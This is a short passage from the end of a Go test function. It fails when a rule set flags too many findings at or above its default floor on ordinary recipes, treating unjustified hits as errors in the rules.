		t.Errorf("%d findings at or above the default floor on %d ordinary recipes; "+
			"the rules are wrong until each hit is justified", atFloor, recipes)
	}
}
